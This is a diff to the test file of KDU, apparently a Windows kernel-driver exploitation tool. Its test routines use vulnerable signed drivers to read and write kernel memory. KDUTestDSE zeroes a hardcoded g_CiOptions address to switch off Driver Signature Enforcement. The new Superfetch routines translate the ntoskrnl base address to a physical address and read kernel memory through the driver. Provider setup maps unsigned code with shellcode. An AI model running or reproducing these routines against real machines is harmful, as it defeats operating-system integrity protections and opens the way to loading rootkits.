@@ -4,9 +4,9 @@
 *
 *  TITLE:       TESTS.CPP
 *
-*  VERSION:     1.44
+*  VERSION:     1.45
 *
-*  DATE:        18 Aug 2025
+*  DATE:        02 Dec 2025
 *
 *  KDU tests.
 *
@@ -50,27 +50,25 @@ VOID KDUTestLoad()
         else {
             printf_s("[+] Provider[%lu] failed to load\r\n", provLoadData->Entries[i].ResourceId);
         }
-
-
     }
 }
 
 VOID KDUTestDSE(PKDU_CONTEXT Context)
 {
-    ULONG_PTR g_CiOptions = 0xfffff8006f039248;//need update
+    ULONG_PTR g_CiOptions = 0xfffff80541c391b0;//need update
     ULONG_PTR oldValue = 0, newValue = 0x0, testValue = 0;
     KDU_PROVIDER* prov = Context->Provider;
 
     if (prov->Callbacks.ReadKernelVM) {
         prov->Callbacks.ReadKernelVM(Context->DeviceHandle, g_CiOptions, &oldValue, sizeof(oldValue));
         Beep(0, 0);
-    } 
+    }
 
     if (prov->Callbacks.WriteKernelVM) {
         prov->Callbacks.WriteKernelVM(Context->DeviceHandle, g_CiOptions, &newValue, sizeof(newValue));
         Beep(0, 0);
     }
-    
+
     if (prov->Callbacks.ReadKernelVM) {
         prov->Callbacks.ReadKernelVM(Context->DeviceHandle, g_CiOptions, &testValue, sizeof(testValue));
 
@@ -87,9 +85,9 @@ BOOL WINAPI TestPhysMemEnumCallback(
     _In_ ULONG_PTR Address,
     _In_ PVOID UserContext)
 {
-   
+
     PKDU_PHYSMEM_ENUM_PARAMS Params = (PKDU_PHYSMEM_ENUM_PARAMS)UserContext;
-   
+
     ULONG signatureSize = Params->DispatchSignatureLength;
 
     BYTE buffer[PAGE_SIZE];
@@ -181,21 +179,146 @@ VOID TestSymbols()
     }
 }
 
+VOID TestSuperfetch(PKDU_CONTEXT Context)
+{
+    BOOLEAN oldValue = FALSE;
+    SUPERFETCH_MEMORY_MAP memoryMap;
+    ULONG_PTR ntosBase;
+    ULONG_PTR physAddress;
+
+    RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &oldValue);
+    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &oldValue);
+
+    printf_s("[*] Building Superfetch memory map...\n");
+
+    if (!supBuildSuperfetchMemoryMap(&memoryMap)) {
+        printf_s("[-] Failed to build memory map\n");
+        return;
+    }
+
+    printf_s("[+] Memory map built: %llu entries from %lu ranges\n",
+        memoryMap.TableSize, memoryMap.RangeCount);
+
+    ntosBase = supGetNtOsBase();
+    printf_s("[*] ntoskrnl base: 0x%llX\n", ntosBase);
+
+    if (supSuperfetchVirtualToPhysical(&memoryMap, ntosBase, &physAddress)) {
+        printf_s("[+] Translated to physical: 0x%llX\n", physAddress);
+    }
+    else {
+        printf_s("[-] Translation failed\n");
+    }
+
+    supFreeSuperfetchMemoryMap(&memoryMap);
+}
+
+VOID TestSuperfetchWithDriver(PKDU_CONTEXT Context)
+{
+    BOOLEAN oldValue = FALSE;
+    SUPERFETCH_MEMORY_MAP memoryMap;
+    ULONG_PTR ntosBase;
+    ULONG_PTR physAddress;
+    USHORT dosSignature = 0;
+    KDU_PROVIDER* prov = Context->Provider;
+
+    RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &oldValue);
+    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &oldValue);
+
+    supPrintfEvent(kduEventInformation,
+        "[+] Building Superfetch memory map...\n");
+
+    if (!supBuildSuperfetchMemoryMap(&memoryMap)) {
+        supPrintfEvent(kduEventError,
+            "[-] Failed to build memory map\n");
+        return;
+    }
+
+    supPrintfEvent(kduEventInformation,
+        "[+] Memory map built: %llu entries from %lu ranges\n",
+        memoryMap.TableSize, memoryMap.RangeCount);
+
+    ntosBase = supGetNtOsBase();
+    supPrintfEvent(kduEventInformation,
+        "[+] ntoskrnl base: 0x%llX\n", ntosBase);
+
+    if (!supSuperfetchVirtualToPhysical(&memoryMap, ntosBase, &physAddress)) {
+        supPrintfEvent(kduEventError,
+            "[-] Translation failed\n");
+        supFreeSuperfetchMemoryMap(&memoryMap);
+        return;
+    }
+
+    supPrintfEvent(kduEventInformation,
+        "[+] Translated to physical: 0x%llX\n", physAddress);
+
+    //
+    // Read MZ signature via physical memory
+    //
+    if (prov->Callbacks.ReadPhysicalMemory(
+        Context->DeviceHandle,
+        physAddress,
+        &dosSignature,
+        sizeof(dosSignature)))
+    {
+        if (dosSignature == IMAGE_DOS_SIGNATURE) {
+            supPrintfEvent(kduEventInformation,
+                "[+] MZ signature verified - translation OK\n");
+        }
+        else {
+            supPrintfEvent(kduEventError,
+                "[-] MZ signature mismatch: 0x%04X\n", dosSignature);
+        }
+    }
+    else {
+        supPrintfEvent(kduEventError,
+            "[-] Failed to read physical memory\n");
+    }
+
+    //
+    // Test virtual memory read via provider
+    //
+    dosSignature = 0;
+    if (prov->Callbacks.ReadKernelVM(
+        Context->DeviceHandle,
+        ntosBase,
+        &dosSignature,
+        sizeof(dosSignature)))
+    {
+        if (dosSignature == IMAGE_DOS_SIGNATURE) {
+            supPrintfEvent(kduEventInformation,
+                "[+] Virtual memory read verified - MZ signature OK\n");
+        }
+        else {
+            supPrintfEvent(kduEventError,
+                "[-] Virtual memory read MZ mismatch: 0x%04X\n", dosSignature);
+        }
+    }
+    else {
+        supPrintfEvent(kduEventError,
+            "[-] Failed to read virtual memory\n");
+    }
+
+    supFreeSuperfetchMemoryMap(&memoryMap);
+
+    supPrintfEvent(kduEventInformation,
+        "[+] All tests completed\n");
+}
+
 VOID KDUTest()
 {
     PKDU_CONTEXT Context;
 
-   // KDUTestLoad();
-
-   // TestSymbols();
-    Context = KDUProviderCreate(KDU_PROVIDER_NEACSAFE64,
-        FALSE, 
-        NT_WIN10_20H1, 
-        KDU_SHELLCODE_V1, 
+    // KDUTestLoad();
+    // TestSymbols();
+    Context = KDUProviderCreate(KDU_PROVIDER_TPUP,
+        FALSE,
+        NT_WIN10_20H1,
+        KDU_SHELLCODE_V1,
         ActionTypeMapDriver);
 
     if (Context) {
-
+        TestSuperfetch(Context);
+        //TestSuperfetchWithDriver(Context);
         //TestBrute(Context);
         KDUTestDSE(Context);
 
